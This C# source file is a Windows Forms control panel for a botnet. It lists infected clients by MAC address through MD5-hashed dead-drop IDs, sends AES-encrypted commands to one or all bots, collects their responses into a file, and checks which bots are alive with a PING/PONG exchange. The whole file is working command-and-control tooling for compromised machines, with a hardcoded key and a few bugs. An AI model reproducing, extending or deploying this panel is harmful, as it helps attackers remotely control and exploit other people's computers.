using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Diagnostics;


namespace SoCalledServer
{
     public partial class SoCalledServer : Form
    {
    
      static  string key = "abcdefghijuklmno0123456789012345";
       static  string privKey = "testtest";
       static string campID = "test";
        
       static string botLoc = campID;
        
        static string conID = campID;
        
        public SoCalledServer()
        {
            conID += "self";
            conID += privKey;
            botLoc += privKey;
            InitializeComponent();

            cmboxMacs.Items.Add("All");
            cmboxMacs.SelectedIndex = 0;
            List<string> clients = getBots(botLoc);
            
            
            setBots();
           
        }


        private void setBots()
        {
            List<string> clients = getBots(botLoc);
            foreach(string client in clients)
            {
                cmboxMacs.Items.Add(client);
            }
        }
        private static string getContent(string id)
        {
            HttpHandler httpDo = new HttpHandler();
            string content = Decrypt(httpDo.getPost(id), key);
            string c = null;
            try
            {
                c = content.TrimEnd('\0'); //removes null bytes that comes with string
            }
            catch (NullReferenceException) { }

            return c;
        }


         List<string> getBots(string botloc)
        {
            HttpHandler httpDo = new HttpHandler();
            string botLocmd5 = MD5(botLoc);
           
            List<string> bots = new List<string>();  
            string macless;
            int previousnumber = 0; 
           while (getContent(botLocmd5) != null)
            {
                   
                macless = getContent(botLocmd5).Replace("mac","");
                bots.Add(macless);
                    botloc = campID;
                    botloc += privKey;
                    previousnumber++;
                    botloc += previousnumber;
                    botLocmd5 = MD5(botloc);


                

            }
            return bots;

         }

        private static string MD5(string text)
        {
            string password = text;

            // byte array representation of that string
            byte[] encodedPassword = new UTF8Encoding().GetBytes(password);

            // need MD5 to calculate the hash
            byte[] hash = ((HashAlgorithm)CryptoConfig.CreateFromName("MD5")).ComputeHash(encodedPassword);

            // string representation (similar to UNIX format)
            string encoded = BitConverter.ToString(hash)
                // without dashes
               .Replace("-", string.Empty)
                // make lowercase
               .ToLower();
            return encoded;
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            string selected = cmboxMacs.SelectedItem.ToString();
            HttpHandler httpDo = new HttpHandler();
            List<string> clients = getBots(botLoc);
            string connection = getConID(campID, selected, privKey);
            if (selected == "All")
            {
                foreach (string macs in clients)
                {
                    txtLog.Text = httpDo.addPost(connection, txtCmd.Text, key);
                }
            }
            else
            {                              
                
                 
                 httpDo.addPost(connection, txtCmd.Text, key);
                 txtLog.Text = "waiting for respond..";
                 sleep(2500,() => txtLog.Text = getContent(getreConID(campID, selected, privKey)));
             }


        }

        private void sleep(int delay, Action action)
        {
            Timer timer = new Timer();
            timer.Interval = delay;
            timer.Tick += (s, e) =>
            {
                action();
                timer.Stop();
            };
            timer.Start();
        }
        public static string Decrypt(string toDecrypt, string key)
        {
            if (toDecrypt == "Error - Not found")
            {
                return null;
            }
            if (toDecrypt != null)
            {

                byte[] keyArray = UTF8Encoding.UTF8.GetBytes(key); // AES-256 key
                byte[] toEncryptArray = Convert.FromBase64String(toDecrypt);
                RijndaelManaged rDel = new RijndaelManaged();
                rDel.Key = keyArray;
                rDel.Mode = CipherMode.ECB;
                rDel.Padding = PaddingMode.None; // better lang support
                ICryptoTransform cTransform = rDel.CreateDecryptor();
                byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
                return UTF8Encoding.UTF8.GetString(resultArray);
            }
            else { return null; }
        } 
         private  string getConID(string cmpID, string mac, string prvKey)
        {
            string connectionID = cmpID;
            connectionID += mac;
            connectionID += prvKey;
            return MD5(connectionID);
        }
         private string getreConID(string cmpID, string mac, string prvKey)
         {
             string connectionID = cmpID;
             connectionID += mac;
             connectionID += prvKey;
             return MD5(MD5(connectionID));
         }
        private void btnRefresh_Click(object sender, EventArgs e)
        {
            cmboxMacs.Items.Clear();
            cmboxMacs.Items.Add("All");
            setBots();
        }

        private void btnResponse_Click(object sender, EventArgs e)
        {
            string selected = cmboxMacs.SelectedItem.ToString();
            HttpHandler httpDo = new HttpHandler();
            List<string> clients = getBots(botLoc);
            //string connection = getConID(campID, selected, privKey);

            if (selected == "All")
            {
                
                SaveFileDialog saveFileDialog1 = new SaveFileDialog();              
                saveFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
                saveFileDialog1.FilterIndex = 2;
                saveFileDialog1.RestoreDirectory = true;
              

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    StreamWriter writer = new StreamWriter(saveFileDialog1.FileName);
                        foreach (string client in clients)
                        {
                           
                            writer.WriteLine(getContent(getreConID(campID, client, privKey)));
                            writer.Close();
                        }
                        
                    
                }
            }
            else
            {

                
                   
               
                txtLog.Text = getContent(getreConID(campID, selected, privKey));

            }
        }
               private void addIfPing(string mac)
        {
            string pingpongaddress = "pingpong";
            pingpongaddress += mac;
            pingpongaddress = MD5(pingpongaddress);
           
                   if (getContent(pingpongaddress) == "PONG")
                   {
                       
                       cmboxMacs.Items.Add(mac);
                   }
        }
        private void btnRefreshAlive_Click(object sender, EventArgs e)
        {
            cmboxMacs.Items.Clear();
            cmboxMacs.Items.Add("All");
            HttpHandler httpDo = new HttpHandler();
            string pingponger = "pingpong";
            List<string> toCheck = getBots(botLoc);
            foreach (string mac in toCheck)
            {
                pingponger += mac;
                pingponger = MD5(pingponger);
                
                
                if (getContent(pingponger) == "PONG" || getContent(pingponger) == null)
                {
                    
                    httpDo.addPost(pingponger, "PING", key);
                    sleep(5000, () => addIfPing(mac));
                }
                
                pingponger = "pingpong";
            }

        }


    }
}
